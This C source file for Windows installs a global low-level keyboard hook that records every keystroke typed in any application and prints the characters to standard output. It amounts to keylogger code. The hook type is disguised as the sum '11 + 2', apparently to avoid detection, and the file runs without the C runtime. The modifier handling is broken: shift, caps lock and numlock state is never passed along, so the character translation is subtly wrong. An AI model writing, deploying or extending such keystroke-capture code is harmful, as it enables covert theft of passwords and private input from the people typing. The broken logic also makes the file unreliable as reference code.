#include <windows.h>
#include <stdbool.h>

static HHOOK g_hook;
static DWORD g_mainTid;

#define F_CAPS   1   // caps lock acts like shift
#define F_NUMPAD 2   // only emits when numlock is on

typedef struct {
    unsigned char code;
    char          normal;
    char          shifted;
    unsigned char flags;
} winkey_t;


#define WIN_KEY_DICT_LEN 67
static const winkey_t winkeys[WIN_KEY_DICT_LEN] = {
    {   8, '\b', '\b', 0              },  // VK_BACK
    {   9, '\t', '\t', 0              },  // VK_TAB
    {  13, '\n', '\n', 0              },  // VK_RETURN
    {  32, ' ',  ' ',  0              },  // VK_SPACE
    {  48, '0',  ')',  0              },  // 0 key
    {  49, '1',  '!',  0              },  // 1 key
    {  50, '2',  '@',  0              },  // 2 key
    {  51, '3',  '#',  0              },  // 3 key
    {  52, '4',  '$',  0              },  // 4 key
    {  53, '5',  '%',  0              },  // 5 key
    {  54, '6',  '^',  0              },  // 6 key
    {  55, '7',  '&',  0              },  // 7 key
    {  56, '8',  '*',  0              },  // 8 key
    {  57, '9',  '(',  0              },  // 9 key
    {  65, 'a',  'A',  F_CAPS         },  // A key
    {  66, 'b',  'B',  F_CAPS         },  // B key
    {  67, 'c',  'C',  F_CAPS         },  // C key
    {  68, 'd',  'D',  F_CAPS         },  // D key
    {  69, 'e',  'E',  F_CAPS         },  // E key
    {  70, 'f',  'F',  F_CAPS         },  // F key
    {  71, 'g',  'G',  F_CAPS         },  // G key
    {  72, 'h',  'H',  F_CAPS         },  // H key
    {  73, 'i',  'I',  F_CAPS         },  // I key
    {  74, 'j',  'J',  F_CAPS         },  // J key
    {  75, 'k',  'K',  F_CAPS         },  // K key
    {  76, 'l',  'L',  F_CAPS         },  // L key
    {  77, 'm',  'M',  F_CAPS         },  // M key
    {  78, 'n',  'N',  F_CAPS         },  // N key
    {  79, 'o',  'O',  F_CAPS         },  // O key
    {  80, 'p',  'P',  F_CAPS         },  // P key
    {  81, 'q',  'Q',  F_CAPS         },  // Q key
    {  82, 'r',  'R',  F_CAPS         },  // R key
    {  83, 's',  'S',  F_CAPS         },  // S key
    {  84, 't',  'T',  F_CAPS         },  // T key
    {  85, 'u',  'U',  F_CAPS         },  // U key
    {  86, 'v',  'V',  F_CAPS         },  // V key
    {  87, 'w',  'W',  F_CAPS         },  // W key
    {  88, 'x',  'X',  F_CAPS         },  // X key
    {  89, 'y',  'Y',  F_CAPS         },  // Y key
    {  90, 'z',  'Z',  F_CAPS         },  // Z key
    { 186, ';',  ':',  0              },  // VK_OEM_1
    { 187, '=',  '+',  0              },  // VK_OEM_PLUS
    { 188, ',',  '<',  0              },  // VK_OEM_COMMA
    { 189, '-',  '_',  0              },  // VK_OEM_MINUS
    { 190, '.',  '>',  0              },  // VK_OEM_PERIOD
    { 191, '/',  '?',  0              },  // VK_OEM_2
    { 192, '`',  '~',  0              },  // VK_OEM_3
    { 219, '[',  '{',  0              },  // VK_OEM_4
    { 220, '\\', '|',  0              },  // VK_OEM_5
    { 221, ']',  '}',  0              },  // VK_OEM_6
    { 222, '\'', '"',  0              },  // VK_OEM_7
    { 226, '\\', '|',  0              },  // VK_OEM_102
    {  96, '0',  '0',  F_NUMPAD       },  // VK_NUMPAD0
    {  97, '1',  '1',  F_NUMPAD       },  // VK_NUMPAD1
    {  98, '2',  '2',  F_NUMPAD       },  // VK_NUMPAD2
    {  99, '3',  '3',  F_NUMPAD       },  // VK_NUMPAD3
    { 100, '4',  '4',  F_NUMPAD       },  // VK_NUMPAD4
    { 101, '5',  '5',  F_NUMPAD       },  // VK_NUMPAD5
    { 102, '6',  '6',  F_NUMPAD       },  // VK_NUMPAD6
    { 103, '7',  '7',  F_NUMPAD       },  // VK_NUMPAD7
    { 104, '8',  '8',  F_NUMPAD       },  // VK_NUMPAD8
    { 105, '9',  '9',  F_NUMPAD       },  // VK_NUMPAD9
    { 106, '*',  '*',  F_NUMPAD       },  // VK_MULTIPLY
    { 107, '+',  '+',  F_NUMPAD       },  // VK_ADD
    { 109, '-',  '-',  F_NUMPAD       },  // VK_SUBTRACT
    { 110, '.',  '.',  F_NUMPAD       },  // VK_DECIMAL
    { 111, '/',  '/',  F_NUMPAD       },  // VK_DIVIDE
};

static const winkey_t *lookup(unsigned vk) {
    for (int i = 0; i < WIN_KEY_DICT_LEN; i++)
        if (winkeys[i].code == vk) return &winkeys[i];
    return NULL;
}

#define M_SHIFT 1
#define M_CAPS  2
#define M_NUM   4

LRESULT CALLBACK KbProc(int code, WPARAM wParam, LPARAM lParam) {
    if (code == HC_ACTION && (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)) {
        KBDLLHOOKSTRUCT *k = (KBDLLHOOKSTRUCT *)lParam;
        LPARAM mods = 0;
        PostThreadMessage(g_mainTid, WM_APP, k->vkCode, mods);
    }
    return CallNextHookEx(g_hook, code, wParam, lParam);
}

static void put_char(char c) {
    DWORD w;
    WriteFile(GetStdHandle(STD_OUTPUT_HANDLE), &c, 1, &w, NULL);
}

void _start(void) {

    g_mainTid = GetCurrentThreadId();
    unsigned char keyboard_code = 11 + 2; // WH_KEYBOARD_LL
    g_hook = SetWindowsHookExA(keyboard_code, KbProc, GetModuleHandleA(NULL), 0);
    if (!g_hook) ExitProcess(1);

    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        if (msg.message != WM_APP) continue;
        const winkey_t *e = lookup((unsigned)msg.wParam);
        if (!e) continue;
        if ((e->flags & F_NUMPAD) && !(msg.lParam & M_NUM)) continue;
        bool shift = msg.lParam & M_SHIFT;
        bool caps  = msg.lParam & M_CAPS;
        put_char((shift ^ (caps && (e->flags & F_CAPS))) ? e->shifted : e->normal);
    }
    UnhookWindowsHookEx(g_hook);
    ExitProcess(0);
}